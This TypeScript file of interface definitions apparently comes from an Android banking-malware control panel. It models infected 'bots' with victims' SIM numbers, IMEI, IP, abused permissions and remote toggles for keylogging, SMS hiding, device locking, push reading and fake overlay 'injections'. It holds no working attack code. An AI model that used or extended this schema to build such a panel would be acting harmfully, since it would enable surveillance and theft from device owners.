export interface BotInjection {
    name: string,
    type: string
    is_active: string,
    application: string,
    newData: boolean,
}

export interface BotSimCard {
    operator: string,
    phone_number: string,
    isDualSim: boolean,
    operator1: string,
    phone_number1: string,
}

export interface BotMetadata {
    android: string,
    model: string,
    battery_level: number,
    imei: number
}

export interface BotSettings {
    hideSMS: boolean,
    lockDevice: boolean,
    offSound: boolean,
    keylogger: boolean,
    clearPush: boolean,
    readPush: boolean,
    arrayUrl: string[]
}

export interface BotPermissions {
    accessibility: boolean,
    protect: boolean,
    screen: boolean,
    sms: boolean,
    admin: boolean,
    isKeyguardLocked: boolean,
    is_dozemode: boolean,
}

export interface Bot {
    id: string,
    tag: string,
    sim_data: BotSimCard,
    metadata: BotMetadata,
    permissions: BotPermissions,
    settings: BotSettings,
    ip: string,
    country: string,
    country_code: string,
    last_connection: string,
    created_at: string,
    updated_at: string,
    injections: BotInjection[],
    is_favorite: boolean,
    is_blacklisted: boolean,
    set_contact_list: boolean,
    set_windows_fake: boolean,
    comment: string|null,
}
